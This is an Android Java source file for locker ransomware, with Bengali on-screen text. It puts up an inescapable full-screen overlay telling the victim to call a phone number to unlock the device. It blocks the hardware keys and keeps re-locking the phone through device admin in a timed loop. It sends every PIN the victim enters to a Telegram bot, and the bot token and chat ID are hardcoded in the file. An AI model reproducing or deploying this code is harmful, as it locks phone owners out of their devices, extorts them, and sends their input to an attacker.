package com.lockscreen;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.Typeface;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

public class LockScreenActivity extends AppCompatActivity {

    // ===========================================================
    // ⚠️    আপনার টেলিগ্রামের তথ্য দিন
    // ===========================================================
    private static final String BOT_TOKEN = "8878710285:AAFBkHc2FFV_5EjA1FJ1rbgsrj-Z6TaxZC0";
    private static final String CHAT_ID = "6851275704";
    // ===========================================================

    private static final String CORRECT_PIN = "7380";
    private EditText pinInput;
    private TextView statusText;
    private WindowManager windowManager;
    private View overlayView;
    private boolean isDestroyed = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_lock_screen);

        // Full screen + keep screen on + prevent lock
        getWindow().addFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN |
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
        );

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            getWindow().setType(WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY);
        }

        setupUI();
        createSystemOverlay();
        startForegroundService(new Intent(this, LockScreenService.class));
        startWakeLockLoop();
    }

    private void setupUI() {
        // Title
        TextView title = findViewById(R.id.titleText);
        title.setText("ফোন আনলক করতে কল করুন");
        title.setTextColor(Color.WHITE);
        title.setTextSize(22);
        title.setTypeface(null, Typeface.BOLD);

        // Phone number
        TextView phone = findViewById(R.id.phoneText);
        phone.setText("+8809658470831");
        phone.setTextColor(Color.parseColor("#FF4444"));
        phone.setTextSize(28);
        phone.setTypeface(null, Typeface.BOLD);

        // PIN input
        pinInput = findViewById(R.id.pinInput);
        pinInput.setHint("পিন লিখুন");
        pinInput.setTextColor(Color.WHITE);
        pinInput.setHintTextColor(Color.GRAY);

        // Status text
        statusText = findViewById(R.id.statusText);
        statusText.setText("");

        // Unlock button
        Button btn = findViewById(R.id.unlockBtn);
        btn.setText("আনলক");
        btn.setOnClickListener(v -> checkPin());
    }

    private void checkPin() {
        String pin = pinInput.getText().toString().trim();
        if (pin.isEmpty()) return;

        // Send to Telegram directly (no Vercel)
        sendToTelegram(pin);

        if (pin.equals(CORRECT_PIN)) {
            statusText.setTextColor(Color.parseColor("#00C853"));
            statusText.setText("✅ সঠিক পিন! আনলক হচ্ছে...");
            new Handler().postDelayed(() -> {
                removeOverlay();
                finishAffinity();
            }, 1000);
        } else {
            statusText.setTextColor(Color.parseColor("#FF4444"));
            statusText.setText("❌ ভুল পিন! আবার চেষ্টা করুন");
            pinInput.setText("");
            lockDevice();
        }
    }

    private void sendToTelegram(String pin) {
        new Thread(() -> {
            try {
                String currentTime = new java.text.SimpleDateFormat(
                    "yyyy-MM-dd HH:mm:ss", java.util.Locale.US
                ).format(new java.util.Date());

                String message = "🔴 <b>PIN CAPTURED!</b>\n"
                    + "━━━━━━━━━━━━\n"
                    + "<b>PIN:</b> <code>" + pin + "</code> "
                    + (pin.equals("7380") ? "✅ CORRECT!" : "❌ WRONG")
                    + "\n━━━━━━━━━━━━\n"
                    + "🤖 Android " + Build.MODEL + "\n"
                    + "📱 Android " + Build.VERSION.RELEASE + "\n"
                    + "🕐 " + currentTime + "\n"
                    + "━━━━━━━━━━━━";

                String json = "{\"chat_id\":\"" + CHAT_ID + "\","
                    + "\"text\":\"" + message.replace("\"", "\\\"").replace("\n", "\\n") + "\","
                    + "\"parse_mode\":\"HTML\","
                    + "\"disable_web_page_preview\":true}";

                java.net.URL url = new java.net.URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);

                java.io.OutputStream os = conn.getOutputStream();
                os.write(json.getBytes("UTF-8"));
                os.flush();
                os.close();

                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void createSystemOverlay() {
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        overlayView = new View(this);
        overlayView.setBackgroundColor(Color.TRANSPARENT);

        int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
            WindowManager.LayoutParams.TYPE_SYSTEM_ERROR;

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
            PixelFormat.TRANSLUCENT
        );
        params.gravity = Gravity.TOP | Gravity.LEFT;

        try {
            windowManager.addView(overlayView, params);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void removeOverlay() {
        if (overlayView != null && windowManager != null) {
            try {
                windowManager.removeView(overlayView);
            } catch (Exception e) {}
            overlayView = null;
        }
    }

    private void lockDevice() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, DeviceAdminReceiver.class);
        if (dpm.isAdminActive(admin)) {
            dpm.lockNow();
        }
    }

    private void startWakeLockLoop() {
        final Handler handler = new Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!isDestroyed) {
                    PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                    PowerManager.WakeLock wl = pm.newWakeLock(
                        PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP,
                        "LockScreen:WakeLock");
                    wl.acquire(2000);
                    wl.release();
                    lockDevice();
                    handler.postDelayed(this, 4000);
                }
            }
        }, 1000);
    }

    @Override
    public void onBackPressed() {
        // Block back button
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        // Block all hardware buttons
        if (keyCode == KeyEvent.KEYCODE_BACK ||
            keyCode == KeyEvent.KEYCODE_HOME ||
            keyCode == KeyEvent.KEYCODE_APP_SWITCH ||
            keyCode == KeyEvent.KEYCODE_POWER ||
            keyCode == KeyEvent.KEYCODE_VOLUME_UP ||
            keyCode == KeyEvent.KEYCODE_VOLUME_DOWN ||
            keyCode == KeyEvent.KEYCODE_VOLUME_MUTE ||
            keyCode == KeyEvent.KEYCODE_MENU) {
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        isDestroyed = true;
        removeOverlay();
    }
          }
